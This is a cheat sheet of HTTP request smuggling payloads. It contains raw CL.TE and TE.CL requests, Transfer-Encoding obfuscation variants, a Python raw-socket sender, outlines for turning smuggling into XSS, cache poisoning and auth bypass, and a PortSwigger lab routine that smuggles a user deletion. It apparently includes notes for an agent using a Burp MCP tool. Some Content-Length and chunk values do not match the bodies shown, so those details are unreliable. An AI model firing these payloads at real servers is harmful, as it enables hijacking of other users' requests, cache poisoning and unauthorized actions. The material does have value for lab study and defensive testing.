# HTTP Request Smuggling - Payload Reference

## CL.TE (Content-Length vs Transfer-Encoding)

### Basic CL.TE
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### How It Works
- Front-end uses Content-Length: 13 (reads "0\r\n\r\n")
- Back-end uses Transfer-Encoding: chunked (reads "0\r\n\r\n" + waits for next chunk)
- "SMUGGLED" becomes the start of the next request

## TE.CL (Transfer-Encoding vs Content-Length)

### Basic TE.CL
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### How It Works
- Front-end uses Transfer-Encoding: reads chunked body (8 bytes + 0 terminator)
- Back-end uses Content-Length: 3, reads "8\r\n" then "SMUGGLED" is leftover

## TE.TE (Transfer-Encoding obfuscation)

### Obfuscation Techniques
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-encoding: chunked
Transfer-Encoding: chunked\t
Transfer-Encoding: \tchunked
Transfer-Encoding: chunKed
```

## Detection

### Timing-Based
```
# Send ambiguous request
# If response time varies = smuggling possible
# CL.TE: back-end waits for next chunk = timeout
# TE.CL: back-end reads extra = fast response
```

### Differential Response
```
# Send request that smuggles a second request
# Check if second request's response appears in next response
```

## Exploitation

### Request Smuggling to XSS
```
# Smuggle a request that returns XSS payload
# Next legitimate user gets the XSS response
```

### Request Smuggling to Cache Poisoning
```
# Smuggle request that poisons cache
# All subsequent cached responses contain malicious content
```

### Request Smuggling to Auth Bypass
```
# Smuggle request with admin session
# Front-end thinks it's the same connection
```

## CRITICAL LESSON: Burp MCP HTTP/2 Problem (Verified)

### Issue
Burp's `send_http1_request` MCP tool auto-upgrades to HTTP/2, which:
- Has its own framing (no Content-Length/Transfer-Encoding conflict)
- Breaks CL/TE ambiguity completely
- Makes smuggling impossible via Burp MCP

### Solution
Use raw Python sockets with `ssl.wrap_socket` for HTTP/1.1 smuggling:
```python
import socket, ssl
s = socket.socket()
s = ssl.wrap_socket(s)
s.connect(('target.com', 443))
s.send(smuggling_payload.encode())
```

### Key Detail
- Must send both smuggle and trigger request on same keep-alive connection
- Front-end reuses same back-end connection for the trigger request
- Back-end sees smuggled bytes + trigger request as one continuous stream

## PortSwigger Lab Approach
1. Send CL.TE request to / endpoint
2. Check if response indicates smuggling
3. If confirmed, smuggle request to delete user
4. Use Burp Repeater with manual Content-Length calculation
